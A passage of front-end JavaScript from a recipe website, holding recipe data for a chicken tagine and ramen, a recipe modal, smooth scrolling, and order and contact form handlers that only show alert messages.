                    '2 large onions, sliced',
                    '1 cup dried apricots',
                    '1/2 cup slivered almonds',
                    '2 tsp ground cinnamon',
                    '2 tsp ground ginger',
                    '1 tsp turmeric',
                    '1 tsp ground cumin',
                    '3 tbsp olive oil',
                    '2 cups chicken stock',
                    'Fresh cilantro for garnish',
                    'Salt and pepper to taste'
                ],
                instructions: [
                    'Heat olive oil in a large tagine or heavy-bottomed pot over medium-high heat.',
                    'Season chicken pieces with salt and pepper, then brown on all sides, about 8 minutes total.',
                    'Remove chicken and set aside. Add onions to the same pot and cook until softened.',
                    'Add all spices and cook for 1 minute until fragrant.',
                    'Return chicken to pot, add stock, and bring to a simmer.',
                    'Cover and cook on low heat for 1 hour.',
                    'Add apricots and continue cooking for 30 minutes.',
                    'Toast almonds in a dry pan until golden.',
                    'Garnish with toasted almonds and fresh cilantro before serving.',
                    'Serve with couscous or flatbread.'
                ]
            },
            'ramen': {
                emoji: '🍜',
                title: 'Authentic Ramen Bowl',
                time: '⏱️ 45 mins',
                servings: '👥 2 servings',
                rating: '⭐ 4.9/5',
                description: 'Rich tonkotsu broth with tender pork, soft-boiled eggs, and fresh noodles. Restaurant-quality ramen at home.',
                ingredients: [
                    '2 portions fresh ramen noodles',
                    '4 cups rich pork or chicken broth',
                    '1/2 lb pork belly, sliced thin',
                    '2 soft-boiled eggs, halved',
                    '2 green onions, chopped',
                    '1 sheet nori, cut in half',
                    '2 cloves garlic, minced',
                    '2 tbsp miso paste',
                    '1 tbsp soy sauce',
                    '1 tsp sesame oil',
                    'Bamboo shoots (optional)',
                    'Corn kernels (optional)'
                ],
                instructions: [
                    'Heat a pan over medium heat and cook pork belly slices until crispy. Set aside.',
                    'In the same pan, sauté garlic until fragrant.',
                    'Add miso paste and cook for 1 minute, then gradually whisk in the broth.',
                    'Add soy sauce and bring to a simmer. Keep warm.',
                    'Cook ramen noodles according to package directions, drain.',
                    'Prepare soft-boiled eggs by boiling for 6-7 minutes, then ice bath.',
                    'Divide noodles between two bowls.',
                    'Ladle hot broth over noodles.',
                    'Top with pork belly, halved eggs, green onions, nori, and optional toppings.',
                    'Drizzle with sesame oil and serve immediately.'
                ]
            }
            // Add more recipes here for other cards...
        };

        // Function to open recipe modal
        function openRecipeModal(recipeKey) {
            const recipe = recipes[recipeKey];
            if (!recipe) return;
            
            const modal = document.getElementById('recipeModal');
            document.getElementById('modalEmoji').textContent = recipe.emoji;
            document.getElementById('modalTitle').textContent = recipe.title;
            document.getElementById('modalTime').textContent = recipe.time;
            document.getElementById('modalServings').textContent = recipe.servings;
            document.getElementById('modalRating').textContent = recipe.rating;
            document.getElementById('modalDescription').textContent = recipe.description;
            
            // Populate ingredients
            const ingredientsList = document.getElementById('modalIngredients');
            ingredientsList.innerHTML = '';
            recipe.ingredients.forEach(ingredient => {
                const li = document.createElement('li');
                li.textContent = ingredient;
                ingredientsList.appendChild(li);
            });
            
            // Populate instructions
            const instructionsList = document.getElementById('modalInstructions');
            instructionsList.innerHTML = '';
            recipe.instructions.forEach(instruction => {
                const li = document.createElement('li');
                li.textContent = instruction;
                instructionsList.appendChild(li);
            });
            
            modal.classList.add('active');
            document.body.style.overflow = 'hidden';
        }

        // Function to close recipe modal
        function closeRecipeModal() {
            const modal = document.getElementById('recipeModal');
            modal.classList.remove('active');
            document.body.style.overflow = 'auto';
        }

        // Close modal when clicking outside
        document.getElementById('recipeModal').addEventListener('click', function(e) {
            if (e.target === this) {
                closeRecipeModal();
            }
        });

        // Smooth scrolling for navigation links
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if (target) {
                    target.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
            });
        });

        // Add click events to recipe cards
        document.addEventListener('DOMContentLoaded', function() {
            const recipeCards = document.querySelectorAll('.recipe-card');
            const recipeKeys = ['carbonara', 'tagine', 'ramen', 'tacos', 'butter-chicken', 'quinoa-bowl', 'chocolate-cake', 'beef-stew', 'gyros', 'sushi'];
            
            recipeCards.forEach((card, index) => {
                if (recipes[recipeKeys[index]]) {
                    card.addEventListener('click', () => openRecipeModal(recipeKeys[index]));
                } else {
                    // For recipes without detailed data, show a coming soon message
                    card.addEventListener('click', () => {
                        alert('Full recipe details coming soon! Use our custom recipe service to get this recipe delivered to your email within 24 hours.');
                    });
                }
            });
        });

        // Form submissions
        document.querySelector('.order-form').addEventListener('submit', function(e) {
            e.preventDefault();
            const recipeName = document.getElementById('recipe-name').value;
            const email = document.getElementById('email').value;
            
            if (recipeName && email) {
                alert(`Thank you! We'll send your custom ${recipeName} recipe to ${email} within 24 hours - completely FREE!`);
                this.reset();
            }
        });

        document.querySelector('.contact-form').addEventListener('submit', function(e) {
            e.preventDefault();
            const name = document.getElementById('contact-name').value;
            
            if (name) {
                alert(`Thank you ${name}! We've received your message and will get back to you soon.`);
                this.reset();
            }
        });

        // Add scroll effect to header
        window.addEventListener('scroll', function() {
